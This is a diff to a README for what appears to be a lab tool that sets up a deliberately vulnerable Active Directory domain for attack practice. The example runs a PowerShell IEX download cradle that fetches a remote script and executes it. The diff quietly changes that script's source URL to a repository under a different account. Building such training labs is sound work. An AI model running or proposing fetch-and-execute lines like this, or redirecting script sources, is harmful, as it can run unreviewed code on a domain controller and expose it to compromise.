@@ -28,10 +28,10 @@ Create a vulnerable active directory that's allowing you to test most of active 
 
 ### Example
 ```powershell
-# if you didn't install Active Directory yet , you can try 
+# if you didn't install Active Directory yet, install it via the command below
 Install-ADDSForest -CreateDnsDelegation:$false -DatabasePath "C:\\Windows\\NTDS" -DomainMode "7" -DomainName "cs.org" -DomainNetbiosName "cs" -ForestMode "7" -InstallDns:$true -LogPath "C:\\Windows\\NTDS" -NoRebootOnCompletion:$false -SysvolPath "C:\\Windows\\SYSVOL" -Force:$true
-# if you already installed Active Directory, just run the script !
-IEX((new-object net.webclient).downloadstring("https://raw.githubusercontent.com/wazehell/vulnerable-AD/master/vulnad.ps1"));
+# just run the script if AD is already installed
+IEX((new-object net.webclient).downloadstring("https://raw.githubusercontent.com/d4ddyd4rth/vulnerable-AD/master/vulnad.ps1"));
 Invoke-VulnAD -UsersLimit 100 -DomainName "cs.org"
 ```
 
